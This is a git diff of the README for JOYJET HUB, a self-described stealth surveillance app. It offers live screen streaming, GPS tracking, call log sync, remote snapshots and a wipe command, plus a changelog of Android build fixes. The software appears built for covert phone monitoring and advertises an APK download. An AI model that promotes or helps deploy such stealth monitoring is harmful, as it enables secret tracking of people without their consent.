@@ -1,19 +1,33 @@
-# 🛸 JOYJET HUB | Tactical Surveillance & Stealth Ecosystem (v4.2.3)
+# 🛸 JOYJET HUB | Tactical Surveillance & Stealth Ecosystem (v4.2.5)
 
 ![Build Status](https://github.com/guru9/joyjet-hub/actions/workflows/android-build.yml/badge.svg)
-[![Download Latest APK (v4.2.3)](https://img.shields.io/badge/Download-Latest_APK-brightgreen?style=for-the-badge&logo=android)](https://github.com/guru9/joyjet-hub/releases/download/latest/app-release.apk)
+[![Download Latest APK (v4.2.5)](https://img.shields.io/badge/Download-Latest_APK-brightgreen?style=for-the-badge&logo=android)](https://github.com/guru9/joyjet-hub/releases/download/latest/app-release.apk)
 
 JOYJET is a high-performance, low-footprint monitoring solution built with React Native (Expo) and Node.js. It features intelligent data management, automated fail-safes for stealth, and real-time telemetry.
 
 ---
 
-## ⚡ LATEST TACTICAL UPDATES (v4.2.3)
+## ⚡ LATEST TACTICAL UPDATES (v4.2.5)
 
 - **WebRTC HD Streaming**: Sub-second latency live screen sharing using secure Peer-to-Peer tunnels.
 - **Pinpoint GPS Tracking**: Integrated high-precision location updates visualized on a dark-mode Tactical Map.
 - **Remote Commands**: Admins can remotely trigger **Snapshots**, **Call Log Sync**, and **System Wipe** commands.
-- **Android 15/16 Ready**: Optimized for the latest OS versions; fixed startup crashes and bridge initialization bugs.
+- **Android 11–15 Ready**: Enforced `minSdkVersion 30` to `targetSdkVersion 35` for full cross-version compatibility.
 - **Free Cloud Build**: Fully integrated GitHub Actions workflow for infinite APK generation without EAS quotas.
+
+---
+
+## 📋 CHANGELOG
+
+### v4.2.5 — 2026-03-05
+
+- 🐛 **Fix: Hermes Bytecode Mismatch** — Removed forced `hermes-compiler` override that caused `Expected 96 but got 98` crash on launch (black screen on all devices).
+- 🐛 **Fix: Splash Screen Black Screen** — Refactored `App.js` boot sequence so the native splash screen only hides after the UI is fully measured and rendered (`onLayout`).
+- 🛡️ **Fix: APP_VERSION ReferenceError** — Imported version from `app.json` in `LoginScreen.js` to prevent a crash on login screen load.
+- ⚙️ **Fix: Release APK Build** — Switched CI from `assembleDebug` to `assembleRelease` so the bundled JS is embedded in the APK (required for offline/online testing).
+- 🔧 **CI: Auto-Cancel Stale Builds** — Added `concurrency` group to GitHub Actions to kill old queued builds and always run the latest.
+- 📱 **Android SDK Alignment** — Synced `minSdkVersion=30` and `targetSdkVersion=35` across `app.json`, `gradle.properties`, and `build.gradle`.
+- 🌑 **System UI Background** — Added `expo-system-ui` to set root window background to black early during native boot, eliminating white flash on start.
 
 ---
 
